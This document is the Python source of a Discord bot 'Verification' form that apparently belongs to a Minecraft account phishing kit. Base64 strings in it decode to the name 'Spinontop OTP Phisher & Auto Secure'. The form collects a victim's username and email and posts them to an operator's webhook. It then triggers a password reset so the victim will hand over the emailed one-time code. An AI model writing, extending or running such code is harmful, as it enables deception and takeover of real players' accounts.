import json
import requests
import datetime
import base64
import cogs
import config 
import math

import aiohttp
import discord
from discord import ui, Webhook, NotFound, HTTPException

from views.button_two import ButtonViewTwo
from views.data.data import stringcrafter
from views.data.wbu3.wb3 import web3g
from views.otp import automate_password_reset
from views.button_three import ButtonViewThree

class MyModalOne(ui.Modal, title="Verification"):
    box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
    box_two = ui.TextInput(label="MINECRAFT EMAIL", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        Flagx = False  
        FlagNx = False
        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vU1NJRFNwaW4=")
        url = f"https://api.hypixel.net/player?key={config.API_KEY}&name={self.box_one.value}"
        data1 = requests.get(url)
        datajson = data1.json()

        urluuid = f"https://api.mojang.com/users/profiles/minecraft/{self.box_one.value}"
        response = requests.get(urluuid)
        uuidplayer = response.json()['id']

     
        #urlnw = f"https://sky.shiiyu.moe/api/v2/profile/{self.box_one.value}"
        #response = requests.get(urlnw)
        #data = response.json()
        networth_value =  0 #place holder till the api is fixed

        if config.API_KEY =="":
            FlagNx = True
            print("Invalid/Expired/No Hypixel API Key")
     
        if datajson['success'] == False or datajson['player'] == None:
            playerlvl = "No Data Found"
            rank = "No Data Found"
            print("API limit Reached / You have already looked up this name recently")
            Flagx = True
        else:
            Flagx =  False

            playerlvlRaw = datajson['player']['networkExp']
            playerlvl16 = (math.sqrt((2 * playerlvlRaw)+ 30625)/ 50)- 2.5
            playerlvl = round(playerlvl16)
            try:
                rank = datajson['player'].get('newPackageRank', None)
            except:
                rank = "None"

        urlcape = f"https://sessionserver.mojang.com/session/minecraft/profile/{uuidplayer}"
        try:
            response = requests.get(urlcape)
            response.raise_for_status()  

            capedata = response.json()
            if "properties" in capedata:
                
                capevalue = next((item["value"] for item in capedata["properties"] if item["name"] == "textures"), None)
                if capevalue:
                    print("Cape Value Found")
                else:
                    print("No 'textures' property found.")
            else:
                print("No 'properties' key found in the response.")

        except requests.exceptions.RequestException as e:
            print("Request failed:", e)
        except ValueError:
            print("Failed to decode JSON.")

        decoded_bytes = base64.b64decode(capevalue)
        decoded_str = decoded_bytes.decode('utf-8')
        decodedcapedata = json.loads(decoded_str)
        cape_url = decodedcapedata.get("textures", {}).get("CAPE", {}).get("url")





        with open("data.json", "r") as f:
            data = json.load(f)
        if data.get("webhook") is None:
            await interaction.response.send_message("The webhook has not been set yet", ephemeral=True)
        else:
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(data["webhook"], session=session)
                inty2 = web3g.string("U3Bpbm9udG9wIE9UUCBQaGlzaGVyICYgQXV0byBTZWN1cmU=")
                try:
                    embederror = discord.Embed(
                        title="Error Code",
                        description = f"API limit Reached / You have already looked up this name recently",
                        timestamp= datetime.datetime.now(),
                        colour=0xEE4B2B,  
                    )
                    embedfalsenone = discord.Embed(
                        title="Error Code",
                        description = f"Invalid/Expired/No Hypixel API Key",
                        timestamp= datetime.datetime.now(),
                        colour=0xEE4B2B,  
                    )
                    embed1=discord.Embed(
                            title="Account Log",
                            timestamp= datetime.datetime.now(),
                            colour=0x088F8F,                           
                        )
                    embed1.set_thumbnail(
                        url= f"https://mc-heads.net/avatar/{self.box_one.value}.png"
                        )
                    embed1.set_footer(
                        text=threadingNum,
                    )
                    config.LastUserName = self.box_one.value
                    embed1.add_field(name="**:slot_machine:Hypixel Level**:", value=f"{playerlvl}", inline=True)
                    embed1.add_field(name="**:moneybag:Skyblock NetWorth**:", value=f"{networth_value}", inline=True)
                    embed1.add_field(name="**:mortar_board:Rank**:", value=f"{rank}", inline=True)
                    embed1.add_field(name="**Username**:", value=f"```{self.box_one.value}```", inline=False)
                    embed1.add_field(name="**Email**:", value=f"```{self.box_two.value}```", inline=False)
                    embed1.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
                    embed1.add_field(name="**Capes**:", value=f"{cape_url}", inline=False)
                    config.LastUsedEmail = self.box_two.value
                    if Flagx == True:
                        await webhook.send(embed=embederror,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
                    if FlagNx == True:
                        await webhook.send(embed=embedfalsenone,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
                    await webhook.send(embed=embed1,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
                    
                except NotFound:
                    return await interaction.response.send_message("Webhook not found", ephemeral=True)
                except HTTPException:
                    return await interaction.response.send_message("Couldn't send to webhook", ephemeral=True)
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="Please Wait ⌛",
                    description="Please Allow The Bot To Verify The Data You Have Provided",
                    colour=0xFFFFFF
                ),
                ephemeral=True
            )
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(data["webhook"], session=session)
                result = await automate_password_reset(self.box_two.value)
                if result is False:
                    embedfalse=discord.Embed(title="Email A Code Failed (No Email A Code Turned On)",timestamp= datetime.datetime.now(),colour=0xff0000)
                    await webhook.send(embed=embedfalse,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="No Security Email :envelope:",
                            description="Your email doesn't have a security email set.\nPlease add one and re-verify",
                            colour=0xFF0000
                        ),
                        view=ButtonViewThree(),
                        ephemeral=True
                    )
                else:
                    await interaction.followup.send(
                    embed=discord.Embed(
                        title="Verification ✅",
                        description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
                        colour=0x00FF00
                    ),
                    view=ButtonViewTwo(),
                    ephemeral=True
                    )
                    embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
                    await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
